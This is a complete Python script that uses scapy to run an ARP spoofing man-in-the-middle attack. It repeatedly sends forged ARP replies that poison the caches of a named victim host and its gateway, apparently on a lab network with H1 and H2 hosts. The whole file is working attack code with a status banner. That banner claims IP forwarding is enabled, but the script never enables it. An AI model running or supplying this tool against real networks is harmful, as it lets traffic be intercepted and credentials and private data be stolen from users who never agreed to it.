#!/usr/bin/env python3

# scapy_arp_spoof.py: ARP Poisoning using programmatic packet construction.

import time
from scapy.all import Ether, ARP, sendp
import sys

# --- Network Definitions ---
IFACE = "eth0"
VICTIM_IP = "10.0.0.10"
GATEWAY_IP = "10.0.0.1"


def arp_spoof(target_ip, spoof_ip):
    """
    Constructs and sends a forged ARP Reply packet (op=2).
    """

    # 1. ARP Layer Construction: The core payload
    arp_packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)

    # 2. Ethernet Layer Construction: The outer Layer 2 frame
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet

    # 3. Send the raw frame at Layer 2 (sendp)
    sendp(ether_frame, iface=IFACE, verbose=False)

    # Print status message
    if target_ip == VICTIM_IP:
        target_name = "VICTIM (H1)"
    else:
        target_name = "GATEWAY (H2)"

    sys.stdout.write(
        f"[>>] SPOOFING {target_name}: {GATEWAY_IP if target_ip == VICTIM_IP else VICTIM_IP} --> Attacker MAC\r"
    )
    sys.stdout.flush()


print("=" * 50)
print("   ARP SPOOFING ATTACK (SCAPY MITM) STARTING")
print("=" * 50)
print("[*] Forwarding Enabled (Stealth Mode)")
print(f"[*] Target Pair: {VICTIM_IP} <-> {GATEWAY_IP}")
print("--- Attack Loop Initiated ---")

try:
    while True:
        # Send fake ARP Replies to maintain the MITM position
        arp_spoof(target_ip=VICTIM_IP, spoof_ip=GATEWAY_IP)
        arp_spoof(target_ip=GATEWAY_IP, spoof_ip=VICTIM_IP)

        time.sleep(2)

except KeyboardInterrupt:
    print("\n--- ARP SPOOFING HALTED ---")
    print("[!] IMPORTANT: The ARP caches may still be poisoned. Run lclean!")
